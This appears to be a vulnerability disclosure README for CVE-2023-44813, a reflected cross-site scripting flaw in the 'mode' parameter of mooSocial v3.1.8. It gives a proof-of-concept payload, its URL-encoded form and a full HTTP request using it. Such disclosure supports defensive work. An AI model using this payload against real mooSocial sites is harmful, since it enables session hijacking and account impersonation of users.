# CVE-2023-44813
A reflected cross-site scripting (XSS) vulnerability in the **mode** parameter on Invite Friend function of mooSocial v3.1.8 which allows attackers to steal user's session cookies and impersonate their account via a crafted URL.

Vulerable Parameter: **mode**

## Exploit - Proof of Concept (POC)

### Reflect cross-site scripting (XSS)  
```
Payload : ');alert(1)//
FINAL Payload (URL encoded) : %27)%3balert(1)%2f%2f
```
GET Request on [/moosocial/friends/ajax_invite?mode=] :
```
GET /moosocial/friends/ajax_invite?mode=model%27)%3balert(1)%2f%2f;' HTTP/1.1
Host: localhost
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="117", "Not;A=Brand";v="8"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: 19edc47bb57545288d88183ca75c9a0bmooSocial[activity_feed]=Q2FrZQ%3D%3D.7R9bpposmi8%3D
Connection: close
```

### Screenshot
![image](https://github.com/ahrixia/moo-xxss-invite/assets/35935843/5e25010a-29b4-4859-823d-eb4269023d3a)


